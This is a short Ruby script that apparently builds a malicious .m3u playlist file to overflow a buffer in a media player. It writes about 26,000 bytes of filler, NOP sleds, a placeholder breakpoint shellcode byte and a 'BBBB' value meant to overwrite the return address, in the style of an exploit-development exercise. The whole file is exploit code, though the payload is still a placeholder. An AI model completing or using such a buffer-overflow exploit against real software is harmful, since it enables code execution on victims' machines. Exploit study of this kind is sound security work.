#!/usr/bin/env ruby

exploit = "test1.m3u"

buffersize = 26065

junk = "\x41" * 250
nop = "\x90" * 50
shellcode = "\xcc"

restbuffer = "\x41" * (buffersize - (junk.size + nop.size + shellcode.size))

eip = "BBBB"
presc = "X" * 54
nop2 = "\x90" * 230

buffer = junk + nop + shellcode + restbuffer

puts "Size of buffer: #{buffer.size}"

File.open(exploit, 'w'){|s| s.write(buffer + eip + presc + nop2)}
puts "File created"